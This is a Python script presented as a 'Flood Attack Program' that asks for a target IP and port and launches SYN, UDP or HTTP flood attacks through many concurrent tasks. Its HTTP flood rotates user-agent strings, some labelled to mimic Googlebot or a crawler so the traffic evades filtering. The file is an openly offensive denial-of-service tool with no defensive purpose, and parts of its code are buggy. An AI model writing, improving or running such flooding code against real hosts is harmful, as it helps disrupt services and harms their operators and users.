import asyncio
import random
import socket
from colorama import Fore
from typing import List
from scapy import *
# Define user agents for HTTP Flood attack
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 Edg/98.0.1108.56',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 YaBrowser/22.2.1.102 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Whale/2.11.118.33 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102; Pretend to be a web crawler',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36; Mimic Googlebot',
    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',
    'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14',
    'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0',
]

# Define colors for console output
COLORS = {
    'RED': Fore.RED,
    'GREEN': Fore.GREEN,
    'YELLOW': Fore.YELLOW,
    'MAGENTA': Fore.MAGENTA,
}

# Print ASCII art
print(COLORS['MAGENTA'] + """
  ____  _   _  __        _____   _____   ____    ___   _   _ 
 / ___|| | | | \ \      / / _ \ | ____| | __ )  / _ \ | | | |
 \___ \| |_| |  \ \ /\ / / | | ||  _|   |  _ \ | | | || | | |
  ___) |  _  |   \ V  V /| |_| || |___  | |_) || |_| || |_| |
 |____/|_| |_|    \_/\_/  \___/ |_____| |____/  \___/  \___/ 
                                                              
""")

async def syn_flood(target_ip: str, target_port: int, num_requests: int, log_file: socket):
    """
    Perform SYN Flood attack.
    """
    total_bytes_sent = 0
    try:
        for _ in range(num_requests):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setblocking(False)
            await asyncio.get_event_loop().sock_connect(s, (target_ip, target_port))
            bytes_sent = s.send(b'data')
            total_bytes_sent += bytes_sent
            await asyncio.sleep(0.01)
            s.close()
        
        log_file.write(f"SYN Flood Attack - Bytes Sent: {total_bytes_sent}\n")
        print(COLORS['MAGENTA'] + "SYN Flood attack completed.")
    except (asyncio.CancelledError, ConnectionError, BufferError, MemoryError) as e:
        print(COLORS['YELLOW'] + f"Continuing the attack. Error: {e}")
    except Exception as e:
        print(COLORS['RED'] + f"Error during SYN Flood attack: {e}")

async def udp_flood(target_ip: str, target_port: int, num_requests: int, log_file: socket):
    """
    Perform UDP Flood attack.
    """
    total_bytes_sent = 0
    try:
        for _ in range(num_requests):
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                bytes_sent = s.sendto(b'data', (target_ip, target_port))
                total_bytes_sent += bytes_sent

        log_file.write(f"UDP Flood Attack - Bytes Sent: {total_bytes_sent}\n")
        print(COLORS['MAGENTA'] + "UDP Flood attack completed.")
    except (asyncio.CancelledError, ConnectionError, BufferError, MemoryError) as e:
        print(COLORS['YELLOW'] + f"Continuing the attack. Error: {e}")
    except Exception as e:
        print(COLORS['RED'] + f"Error during UDP Flood attack: {e}")

async def http_flood(target_ip: str, target_port: int, num_requests: int, log_file: socket):
    """
    Perform HTTP Flood attack.
    """
    total_bytes_sent = 0
    try:
        for _ in range(num_requests):
            reader, writer = await asyncio.open_connection(target_ip, target_port)
            user_agent = random.choice(USER_AGENTS)
            request = f'GET / HTTP/1.1\r\nHost: example.com\r\nUser-Agent: {user_agent}\r\nContent-Length: 0\r\n\r\n'
            bytes_sent = writer.write(request.encode())
            total_bytes_sent += bytes_sent
            await writer.drain()
            await asyncio.sleep(0.01)
            writer.close()
            await reader.read()

        log_file.write(f"HTTP Flood Attack - Bytes Sent: {total_bytes_sent}\n")
        print(COLORS['MAGENTA'] + "HTTP Flood attack completed.")
    except (asyncio.CancelledError, ConnectionError, BufferError, MemoryError) as e:
        print(COLORS['YELLOW'] + f"Continuing the attack. Error: {e}")
    except Exception as e:
        print(COLORS['RED'] + f"Error during HTTP Flood attack: {e}")

async def start_attack(target_ip: str, target_port: int, tasks_count: int, layer: int, num_requests: int, num_bots: int, num_packets: int):
    """
    Start the flood attack based on the selected layer.
    """
    tasks = []
    log_file = open("attack_log.txt", "a")

    try:
        if layer == 1:
            attack_func = syn_flood
        elif layer == 2:
            attack_func = udp_flood
        elif layer == 3:
            attack_func = http_flood
        else:
            print(COLORS['RED'] + "Invalid layer selected")
            return

        for _ in range(num_bots):
            tasks.append(attack_func(target_ip, target_port, num_requests, log_file))
        await asyncio.gather(*tasks)
    except KeyboardInterrupt:
        print(COLORS['YELLOW'] + "\nProgram stopped by the user.")
    except Exception as e:
        print(COLORS['RED'] + f"Error: {e}")
    finally:
        log_file.close()

async def main():
    """
    Main function to start the flood attack program.
    """
    print(COLORS['GREEN'] + "Welcome to Flood Attack Program!")

    target_ip = input("Enter the target IP address: ")
    target_port = int(input("Enter the target port: "))
    tasks_count = 10000000000

    print("Choose the attack layer:")
    print("1. Layer 4 (SYN Flood)")
    print("2. Layer 4 (UDP Flood)")
    print("3. Layer 7 (HTTP Flood)")
    layer = int(input("Choose the layer (1-3): "))

    num_requests = int(input("Enter the number of requests: "))
    num_bots = int(input("Enter the number of bots: "))
    num_packets = None
    if layer in [2, 3]:
        num_packets = int(input("Enter the number of packets: "))

    timeout = int(input("Enter the timeout duration in seconds: "))
    await asyncio.wait_for(start_attack(target_ip, target_port, tasks_count, layer, num_requests, num_bots, num_packets), timeout=timeout)

if __name__ == "__main__":
    asyncio.run(main())
